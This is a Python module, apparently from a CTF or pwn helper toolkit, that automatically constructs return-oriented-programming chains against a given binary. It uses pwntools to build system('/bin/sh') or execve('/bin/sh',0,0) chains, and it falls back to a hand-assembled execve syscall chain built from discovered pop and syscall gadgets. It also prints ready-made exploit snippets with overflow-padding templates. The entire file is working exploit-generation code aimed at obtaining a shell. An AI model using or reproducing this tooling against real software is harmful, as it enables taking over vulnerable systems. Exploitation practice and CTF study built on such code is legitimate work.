"""Automatic ROP-chain construction.

Strategy, in order of preference:
  1) Use pwntools' ROP engine on the binary (+ optional libc) to build a
     system('/bin/sh') or execve('/bin/sh', 0, 0) chain automatically.
  2) If that can't resolve, fall back to a hand-assembled execve syscall chain
     from the key gadgets we discovered (pop rdi/rsi/rdx/rax ; syscall).
Emits both the raw chain (as a pwntools snippet) and a human explanation.

No execution, no network: this prepares the chain; you send it from your exploit.
"""
from . import pwn_mod as P


def _try_pwntools_rop(bin_path, libc_path=None):
    """Return (ok, description, code_snippet)."""
    try:
        import logging
        logging.getLogger("pwnlib").setLevel(logging.CRITICAL)
        from pwn import context, ELF, ROP
        context.log_level = "critical"
    except Exception as e:
        return False, f"pwntools unavailable: {e}", ""
    try:
        elf = ELF(bin_path, checksec=False)
        context.binary = elf
        rop = ROP(elf)
        libs = [elf]
        libc = None
        if libc_path:
            libc = ELF(libc_path, checksec=False)
            libs.append(libc)
            rop = ROP(libs)

        built = None
        method = ""
        # Prefer system('/bin/sh')
        binsh = None
        try:
            binsh = next(elf.search(b"/bin/sh\x00"))
        except StopIteration:
            binsh = None
        if binsh is None and libc is not None:
            try:
                binsh = next(libc.search(b"/bin/sh\x00"))
            except StopIteration:
                binsh = None

        system_sym = elf.sym.get("system") if "system" in elf.sym else None
        if system_sym is None and libc is not None:
            system_sym = libc.sym.get("system")

        if system_sym and binsh is not None:
            try:
                rop.system(binsh)
                built = rop.chain()
                method = "system('/bin/sh')"
            except Exception:
                built = None
        if built is None:
            # try execve via rop.execve helper (pwntools can SROP/auto)
            try:
                rop.execve(binsh if binsh is not None else b"/bin/sh", 0, 0)
                built = rop.chain()
                method = "execve('/bin/sh', 0, 0)"
            except Exception:
                built = None

        if built is None:
            return False, "pwntools ROP couldn't auto-resolve a chain (need a libc or more gadgets)", _dump_rop(rop)

        # render the chain as readable rop.dump() + a code snippet
        dump = ""
        try:
            dump = rop.dump()
        except Exception:
            pass
        snippet = _snippet(bin_path, libc_path, method)
        desc = f"pwntools built a {method} chain ({len(built)} bytes).\n{dump}"
        return True, desc, snippet
    except Exception as e:
        return False, f"ROP build error: {e}", ""


def _dump_rop(rop):
    try:
        return rop.dump()
    except Exception:
        return ""


def _snippet(bin_path, libc_path, method):
    import os
    b = os.path.basename(bin_path)
    lines = [
        "from pwn import *",
        f"elf = context.binary = ELF({b!r}, checksec=False)",
    ]
    if libc_path:
        lines.append(f"libc = ELF({os.path.basename(libc_path)!r}, checksec=False)")
        lines.append("rop = ROP([elf, libc])")
        lines.append("# NOTE: for a dynamic target you usually LEAK libc first, set")
        lines.append("#       libc.address = leak - libc.sym['<leaked_fn>'], THEN build the chain.")
    else:
        lines.append("rop = ROP(elf)")
    lines.append("binsh = next((elf.search(b'/bin/sh\\x00')), None)"
                 + (" or next(libc.search(b'/bin/sh\\x00'))" if libc_path else ""))
    if "system" in method:
        lines.append("rop.system(binsh)")
    else:
        lines.append("rop.execve(binsh, 0, 0)")
    lines.append("chain = rop.chain()")
    lines.append("print(rop.dump())")
    lines.append("# payload = b'A'*OFFSET + chain   # prepend your overflow padding")
    return "\n".join(lines)


def _manual_syscall_chain(bin_path, gadgets):
    """Hand-assemble an execve('/bin/sh',0,0) syscall chain from discovered gadgets.
    Works when the binary is static/no-libc but has the needed pop gadgets + syscall
    + a writable area to stage '/bin/sh'. Returns (ok, desc, snippet)."""
    need = {
        "pop rdi ; ret": gadgets.get("pop rdi ; ret"),
        "pop rsi ; ret": gadgets.get("pop rsi ; ret"),
        "pop rdx ; ret": gadgets.get("pop rdx ; ret"),
        "pop rax ; ret": gadgets.get("pop rax ; ret"),
        "syscall": gadgets.get("syscall"),
    }
    missing = [k for k, v in need.items() if not v]
    binsh = [b for b in P.bin_sh_addresses(bin_path) if b[1] is not None]
    if missing:
        return (False,
                "Manual execve syscall chain needs these gadgets, still missing: "
                + ", ".join(missing)
                + ". Search libc/binary for them, or leak libc and use ret2libc instead.",
                "")
    binsh_va = binsh[0][1] if binsh else None
    g = {k: hex(v[0]) for k, v in need.items()}
    snippet = f"""from pwn import *
# execve('/bin/sh', NULL, NULL) via direct syscall (no libc needed)
POP_RDI = {g['pop rdi ; ret']}
POP_RSI = {g['pop rsi ; ret']}
POP_RDX = {g['pop rdx ; ret']}
POP_RAX = {g['pop rax ; ret']}
SYSCALL = {g['syscall']}
BINSH   = {hex(binsh_va) if binsh_va else "0  # TODO: stage '/bin/sh' into a writable addr first"}
chain = flat(
    POP_RDI, BINSH,     # rdi = ptr to '/bin/sh'
    POP_RSI, 0,         # rsi = 0
    POP_RDX, 0,         # rdx = 0
    POP_RAX, 59,        # rax = 59 (execve)
    SYSCALL,
)
# payload = b'A'*OFFSET + chain
"""
    desc = ("Hand-assembled execve syscall chain from discovered gadgets"
            + ("" if binsh_va else " (you still need to write '/bin/sh' somewhere writable)"))
    return True, desc, snippet


def build(bin_path, gadgets, libc_path=None):
    """Top-level: try pwntools auto, then manual syscall fallback."""
    ok, desc, snip = _try_pwntools_rop(bin_path, libc_path)
    if ok:
        return {"ok": True, "method": "pwntools-auto", "desc": desc, "snippet": snip}
    # fallback
    mok, mdesc, msnip = _manual_syscall_chain(bin_path, gadgets)
    if mok:
        return {"ok": True, "method": "manual-syscall", "desc": mdesc, "snippet": msnip}
    # neither worked — return the more useful diagnostic
    return {"ok": False, "method": None,
            "desc": desc + "\n" + mdesc, "snippet": snip or msnip}
